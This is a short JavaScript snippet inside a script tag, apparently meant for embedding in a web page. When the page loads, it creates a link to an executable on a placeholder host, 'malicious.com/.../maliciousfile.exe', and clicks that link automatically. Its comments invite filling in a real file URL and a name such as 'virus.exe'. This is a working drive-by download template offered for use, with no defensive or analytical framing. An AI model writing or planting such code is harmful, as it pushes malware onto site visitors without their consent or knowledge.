<script>function initiateFileDownload() {
  // Create a new anchor element
  var link = document.createElement('a');

  // Set the href attribute to the file's URL
  link.href = 'https://malicious.com/path/to/maliciousfile.exe'; // Replace with the actual file URL

  // Set the download attribute with the desired file name (optional,remove "///" for the attribute to function)
  ///link.download = 'virus.exe'; // Replace with the desired file name

  // Programmatically trigger a click event on the anchor element
  var clickEvent = new MouseEvent('click', {
    view: window,
    bubbles: true,
    cancelable: false
  });
  link.dispatchEvent(clickEvent);
}

// Call the function to initiate the download
initiateFileDownload();
</script>
